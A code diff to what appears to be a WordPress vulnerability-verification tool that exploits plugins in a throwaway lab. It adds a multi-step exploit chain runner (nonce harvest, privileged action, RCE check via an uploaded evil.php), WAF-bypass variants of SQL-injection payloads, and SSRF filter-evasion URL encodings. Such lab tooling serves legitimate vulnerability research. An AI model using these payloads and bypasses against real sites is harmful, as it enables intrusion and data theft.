@@ -415,6 +415,120 @@ def _scan_rest_routes(plugin_source_dir: str) -> list:
     return results[:20]  # cap to avoid flooding step output
 
 
+def _wp_run_request_chain(
+    base_url: str,
+    chain: list,
+    admin_sess,
+    sub_sess,
+    anon_sess,
+    step: "Callable",
+) -> "tuple[bool, str, dict]":
+    """Execute a multi-step request chain against a live WordPress lab.
+
+    Each step dict supports:
+      method, endpoint, body (JSON string or form dict), headers,
+      auth (admin|subscriber|anon), extract ({var: 'json:path' | 'regex:...'}),
+      confirm_string, confirm_status, is_final.
+    Returns (verified, detail, evidence).
+
+    Generic — works for any WP CVE that needs multi-step exploitation:
+    1) login → 2) CSRF token harvest → 3) privileged action → 4) verify effect
+    """
+    vars_: dict = {}
+    _sess_map = {"admin": admin_sess, "subscriber": sub_sess, "anon": anon_sess}
+
+    def _sub(text: str) -> str:
+        for k, v in vars_.items():
+            text = text.replace("{{" + k + "}}", str(v))
+        return text
+
+    def _jp(obj, path: str):
+        for part in path.split("."):
+            if isinstance(obj, dict):
+                obj = obj.get(part)
+            else:
+                return None
+        return obj
+
+    final_evidence: dict = {}
+    for idx, sd in enumerate(chain):
+        method = (sd.get("method") or "GET").upper()
+        ep = _sub(sd.get("endpoint") or "/")
+        url = base_url.rstrip("/") + ep
+        hdrs: dict = {k: _sub(str(v)) for k, v in (sd.get("headers") or {}).items()}
+        sess = _sess_map.get(sd.get("auth", "anon")) or anon_sess
+        raw_body = sd.get("body") or ""
+        body_data = None
+        if method not in ("GET", "HEAD") and raw_body:
+            if isinstance(raw_body, dict):
+                body_data = {k: _sub(str(v)) for k, v in raw_body.items()}
+                hdrs.setdefault("Content-Type", "application/x-www-form-urlencoded")
+            else:
+                try:
+                    import json as _j
+                    body_data = _j.dumps(_j.loads(_sub(raw_body)))
+                    hdrs.setdefault("Content-Type", "application/json")
+                except Exception:
+                    body_data = _sub(raw_body)
+        step(f"  wp-chain[{idx}]: {method} {ep} (auth={sd.get('auth','anon')})")
+        try:
+            r = sess.request(
+                method, url,
+                data=body_data if isinstance(body_data, (str, dict)) else None,
+                json=body_data if isinstance(body_data, dict) and "json" in hdrs.get("Content-Type","") else None,
+                params=({k: _sub(str(v)) for k, v in (sd.get("params") or {}).items()} or None),
+                headers=hdrs,
+                timeout=20,
+                allow_redirects=True,
+            )
+        except Exception as exc:
+            return False, f"wp-chain[{idx}] request error: {exc}", {}
+        body_text = r.text or ""
+        # Extract variables
+        for var_name, expr in (sd.get("extract") or {}).items():
+            if expr.startswith("json:"):
+                try:
+                    import json as _j2
+                    val = _jp(_j2.loads(body_text), expr[5:])
+                    if val is not None:
+                        vars_[var_name] = val
+                        step(f"  wp-chain[{idx}]: extracted {var_name}={str(val)[:40]}")
+                except Exception:
+                    pass
+            elif expr.startswith("regex:"):
+                try:
+                    m2 = re.search(expr[6:], body_text)
+                    if m2:
+                        vars_[var_name] = m2.group(1) if m2.lastindex else m2.group(0)
+                        step(f"  wp-chain[{idx}]: extracted {var_name}={vars_[var_name][:40]!r}")
+                except Exception:
+                    pass
+            elif expr.startswith("nonce:"):
+                # Auto-extract WordPress nonce from HTML
+                nonces = _scrape_nonce_candidates(body_text)
+                if nonces:
+                    vars_[var_name] = nonces[0]
+                    step(f"  wp-chain[{idx}]: nonce extracted → {vars_[var_name]}")
+        # Status check
+        expect_st = sd.get("confirm_status")
+        if expect_st and r.status_code != expect_st:
+            return False, f"wp-chain[{idx}] HTTP {r.status_code} != expected {expect_st}", {}
+        is_final = sd.get("is_final", idx == len(chain) - 1)
+        if is_final:
+            final_evidence = {
+                "status": r.status_code, "body_snippet": body_text[:400],
+                "vars": {k: str(v)[:100] for k, v in vars_.items()},
+                "endpoint": ep,
+            }
+            cs = sd.get("confirm_string", "")
+            if cs:
+                if cs in body_text:
+                    return True, f"wp-chain VERIFICADO: '{cs}' en respuesta", final_evidence
+                return False, f"wp-chain[{idx}] '{cs}' no encontrado — HTTP {r.status_code}", final_evidence
+            return True, f"wp-chain[{idx}] HTTP {r.status_code} OK (sin confirm_string)", final_evidence
+    return False, "request_chain vacío", {}
+
+
 _NONCE_HTML_RE = re.compile(
     r'(?:nonce|security)["\']?\s*[:=]\s*["\']([a-f0-9]{8,16})["\']', re.I)
 _WPNONCE_INPUT_RE = re.compile(
@@ -7518,6 +7632,76 @@ def verify_wordpress_sqli(
         contexts = ["'", '"', "", "')", '")']
         comments = ["-- -", "#"]
 
+        def _waf_expand_sqli_payloads(orig: str, fn: str, ctx: str, cm: str) -> list:
+            """
+            Generate WAF-bypass variants of a standard error-based SQLi payload.
+            Generic — applies to ALL CVEs. No per-CVE hardcoding.
+
+            Techniques:
+            1. Comment-separated keywords: AND extractvalue → AND/**/extractvalue
+            2. Case mixing: extractvalue → ExtRaCtVaLuE
+            3. MySQL inline comment: extractvalue → /*!50000extractvalue*/
+            4. Whitespace variants: space → tab (%09)
+            5. Versioned inline comment on SELECT: 0x7e,version() → 0x7e,/*!version*/()
+            6. Alternative hex prefix: concat(0x7e → concat(char(126)
+            """
+            base = f"{orig}{ctx} AND {fn}{cm}"
+            variants = []
+            # 1. Comment-separated keywords
+            variants.append(f"{orig}{ctx}/**/AND/**/{fn}{cm}")
+            # 2. Case mixing on function name
+            fn_mixed = "".join(c.upper() if i % 2 == 0 else c.lower()
+                               for i, c in enumerate(fn))
+            variants.append(f"{orig}{ctx} AND {fn_mixed}{cm}")
+            # 3. MySQL inline comment bypass (passes WAFs that strip SQL keywords)
+            fn_inline = fn.replace("extractvalue", "/*!50000extractvalue*/").replace(
+                "updatexml", "/*!50000updatexml*/")
+            if fn_inline != fn:
+                variants.append(f"{orig}{ctx} AND {fn_inline}{cm}")
+            # 4. Tab instead of space (WAFs that only strip literal spaces)
+            variants.append(f"{orig}{ctx}\tAND\t{fn}{cm}")
+            # 5. Alternative hex: concat(0x7e,version()) → concat(char(126),version())
+            fn_char = fn.replace("0x7e,version()", "char(126),version()").replace(
+                "0x7e,version()", "char(126),version()")
+            if fn_char != fn:
+                variants.append(f"{orig}{ctx} AND {fn_char}{cm}")
+            # 6. Double URL-encoded injection prefix (for endpoints that URL-decode twice)
+            variants.append(f"{orig}{ctx}%20AND%20{fn}{cm}")
+            # Remove exact duplicates and the base payload (already tried)
+            seen = {base}
+            result = []
+            for v in variants:
+                if v not in seen:
+                    seen.add(v)
+                    result.append(v)
+            return result[:6]  # cap at 6 per combination to bound budget
+
+        def _sqli_encode_variants(payload: str) -> list:
+            """
+            Returns encoding variants of a SQLi payload for simple string-filter bypass.
+            - Comment-separated UNION/SELECT keywords
+            - Case mixing on SQL keywords
+            - MySQL version comment on function names
+            """
+            variants = []
+            # Comment injection in UNION SELECT
+            v1 = re.sub(r'\bUNION\s+SELECT\b', 'UNION/**/SELECT', payload, flags=re.I)
+            if v1 != payload:
+                variants.append(v1)
+            # Case mixing on keywords
+            def _mix_case(m):
+                w = m.group(0)
+                return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(w))
+            v2 = re.sub(r'\b(UNION|SELECT|AND|OR|FROM|WHERE)\b', _mix_case, payload)
+            if v2 != payload:
+                variants.append(v2)
+            # Inline comment on extractvalue/updatexml
+            v3 = re.sub(r'\b(extractvalue|updatexml)\b',
+                        lambda m: f'/*!50000{m.group(0)}*/', payload, flags=re.I)
+            if v3 != payload:
+                variants.append(v3)
+            return [v for v in variants if v != payload][:3]
+
         # ORDER BY injection fast-path: when sqli_via_orderby=True the vulnerable parameter
         # feeds directly into an ORDER BY clause (not WHERE), so standard error/UNION/boolean/
         # time-based WHERE payloads cannot work. Try ORDER BY techniques first so we don't
@@ -7670,6 +7854,46 @@ def verify_wordpress_sqli(
                 if new_versions:
                     error_found = (payload_val, sorted(new_versions)[0], r)
                     break
+
+        # WAF bypass round: if standard error-based payloads failed AND budget allows,
+        # try obfuscated variants (comment injection, case mixing, MySQL inline comments,
+        # tab whitespace, char() encoding). Generic — works for any SQLi target.
+        import time as _time_waf
+        _waf_budget_ok = not error_found and (budget_s - (_time_waf.time() - t0)) > 60
+        if _waf_budget_ok:
+            step("error-based estandar fallo — intentando variantes WAF-bypass...")
+            waf_tried = []
+            for ctx in contexts:
+                for fn in ("extractvalue(1,concat(0x7e,version()))",
+                           "updatexml(1,concat(0x7e,version()),1)"):
+                    for cm in comments:
+                        for waf_payload in _waf_expand_sqli_payloads(orig_value, fn, ctx, cm):
+                            try:
+                                r = send(waf_payload)
+                            except Exception as e:
+                                waf_tried.append({"payload": waf_payload, "error": str(e)})
+                                continue
+                            new_versions = {v for v in re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b",
+                                            r.text or "") if _is_plausible_mysql_ver(v)} - version_noise
+                            waf_tried.append({"payload": waf_payload, "status": r.status_code,
+                                              "version_nueva": sorted(new_versions),
+                                              "respuesta_cuerpo_recorte": (r.text or "")[:300]})
+                            if new_versions:
+                                error_found = (waf_payload, sorted(new_versions)[0], r)
+                                break
+                            if (budget_s - (_time_waf.time() - t0)) <= 15:
+                                break
+                        if error_found:
+                            break
+                    if error_found:
+                        break
+                if error_found:
+                    break
+            error_tried.extend(waf_tried)
+            if error_found:
+                step(f"WAF bypass exitoso: {len(waf_tried)} variantes probadas, payload obfuscado funciono")
+            else:
+                step(f"WAF bypass: {len(waf_tried)} variantes probadas, ninguna filtro version()")
 
         if error_found:
             payload_val, mysql_version, r = error_found
@@ -8763,11 +8987,22 @@ def verify_wordpress_ssrf(
                 dec = (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]
                 hexip = "0x" + "".join(f"{x:02x}" for x in parts)
                 octip = "0" + ".".join(f"{x:03o}" for x in parts)
+                # Short-form: 10.0.2.1 → 10.0.513 (last two octets merged)
+                shortip = f"{parts[0]}.{parts[1]}.{parts[2] * 256 + parts[3]}"
+                # Double URL-encode of dots: 10.0.2.1 → 10%252e0%252e2%252e1
+                dblenc = "%252e".join(str(x) for x in parts)
+                # IPv6 representations of the same address
+                ipv6_mapped = f"::ffff:{parts[0]:d}.{parts[1]:d}.{parts[2]:d}.{parts[3]:d}"
+                ipv6_hex = f"::ffff:{parts[0]:02x}{parts[1]:02x}:{parts[2]:02x}{parts[3]:02x}"
                 urls += [
                     f"http://{listener_ip}:8080/{path}",                         # IP literal
                     f"http://{dec}:8080/{path}",                                 # IP decimal
                     f"http://{hexip}:8080/{path}",                               # IP hex
                     f"http://{octip}:8080/{path}",                               # IP octal
+                    f"http://{shortip}:8080/{path}",                             # short-form
+                    f"http://[{ipv6_mapped}]:8080/{path}",                       # IPv6 mapped
+                    f"http://[{ipv6_hex}]:8080/{path}",                          # IPv6 hex
+                    f"http://{dblenc}:8080/{path}",                              # double URL-encoded
                     f"http://trusted-host@{listener_ip}:8080/{path}",            # userinfo trick
                     f"http://{listener_ip}:8080@evil.invalid/{path}",            # userinfo (al reves)
                     f"http://{lab.listener}.:8080/{path}",                       # trailing dot DNS
@@ -12266,3 +12501,76 @@ def escalate_post_sqli(
         pass
 
     return result
+
+
+def verify_wordpress_request_chain(
+    plugin_source_dir: str,
+    slug: str,
+    request_chain: list,
+    on_step=None,
+    budget_s: float = 900.0,
+    companion_plugins=None,
+    setup_wp_options=None,
+    setup_wp_commands=None,
+    keep_lab_on_failure: bool = False,
+) -> WpVerifyResult:
+    """Generic multi-step WordPress exploit verifier using _wp_run_request_chain.
+
+    Enables complex attack chains like:
+      1) GET /wp-admin/admin.php?page=X  → extract nonce
+      2) POST /wp-admin/admin-ajax.php   → privileged action using nonce
+      3) GET  /wp-content/uploads/evil.php → confirm RCE
+
+    Each step in request_chain is a dict with:
+      method, endpoint, body, headers, auth (admin|subscriber|anon),
+      extract ({var: 'json:path' | 'regex:...' | 'nonce:'}),
+      confirm_string, confirm_status, is_final, params.
+    """
+    step = on_step or (lambda _m: None)
+    pre = _check_prereqs(plugin_source_dir, slug)
+    if pre is not None:
+        return pre
+    res = WpVerifyResult()
+    t0 = time.time()
+    lab = _Lab(_token())
+    boot = None
+    try:
+        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
+                              companion_plugins=companion_plugins)
+        if boot is None:
+            res.detail = "fallo al arrancar el laboratorio WordPress"
+            return res
+
+        if setup_wp_options:
+            for opt in (setup_wp_options or []):
+                _n = (opt or {}).get("name") if isinstance(opt, dict) else None
+                if _n:
+                    lab.wp_cli("option", "update", _n, str((opt or {}).get("value", "1")), timeout=30)
+
+        if setup_wp_commands:
+            for cmd in (setup_wp_commands or []):
+                if cmd:
+                    _args = cmd if isinstance(cmd, list) else str(cmd).split()
+                    lab.wp_cli(*_args, timeout=60)
+
+        anon_sess = _make_session()
+        admin_sess = _wp_login(boot.base_url, boot.admin_user, boot.admin_pass, on_step=step) or _make_session()
+        sub_sess = _wp_login(boot.base_url, boot.sub_user, boot.sub_pass, on_step=step) or _make_session()
+
+        verified, detail, evidence = _wp_run_request_chain(
+            boot.base_url, request_chain, admin_sess, sub_sess, anon_sess, step)
+
+        res.verified = verified
+        res.ok = verified or bool(evidence)
+        res.detail = detail
+        res.confidence = "confirmed" if verified else "inconclusive"
+        res.evidence.update(evidence)
+        res.evidence["base_url"] = boot.base_url
+        res.evidence["screenshots"] = boot.shots
+        res.evidence["http_captures"] = boot.http_captures
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado en request_chain: {e}"
+        return res
+    finally:
+        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)
